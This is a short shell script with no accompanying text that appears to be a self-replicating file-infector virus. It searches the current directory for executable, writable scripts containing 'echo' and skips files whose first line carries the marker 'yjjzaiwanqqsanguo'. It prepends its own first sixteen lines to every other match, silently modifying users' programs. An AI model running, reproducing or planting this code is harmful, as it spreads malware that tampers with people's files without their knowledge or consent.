for file in ./*; do
if test -f $file && test -x $file && test -w $file ; then
if grep -s echo $file>/dev/nul ; then
head -n 1 $file>.mm
if grep -s yjjzaiwanqqsanguo .mm >/dev/nul; then
rm -f .mm ; else
head -n 16 $0>.SAVEE
cat $file>>.SAVEE
cat .SAVEE>$file
fi fi fi
done
rm -f .SAVEE .mm
